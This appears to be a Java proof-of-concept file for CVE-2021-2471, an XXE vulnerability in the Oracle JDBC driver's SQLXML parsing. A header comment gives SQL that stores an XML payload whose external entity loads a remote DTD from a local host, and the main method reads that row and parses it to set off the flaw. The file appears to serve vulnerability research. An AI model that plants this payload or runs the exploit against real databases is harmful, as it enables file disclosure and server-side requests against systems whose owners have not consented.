package me.threedr3am.bug.jdbc.sqlxml.xxe.oracle;

import javax.xml.transform.dom.DOMSource;
import java.sql.*;

/**
 * CVE-2021-2471
 * https://nvd.nist.gov/vuln/detail/CVE-2021-2471
 *
 * create table tb_test (id bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',message text COMMENT 'SQLXML',PRIMARY KEY (`id`));
 *
 * insert into tb_test(message) value('<?xml version="1.0" ?> <!DOCTYPE note [ <!ENTITY % remote SYSTEM "http://127.0.0.1:80/xxe.dtd"> %remote; ]>');
 */
public class OracleJDBC {

    public static void main(String[] args) throws SQLException {
        Connection connection = MySQLConnectorJFactory.getConnection();
        if (connection != null) {
            Statement statement = connection.createStatement();
            statement.execute("select * from tb_test");
            ResultSet resultSet = statement.getResultSet();
            while (resultSet.next()) {
                SQLXML sqlxml = resultSet.getSQLXML("message");
                sqlxml.getSource(DOMSource.class);
            }
        }
    }
}
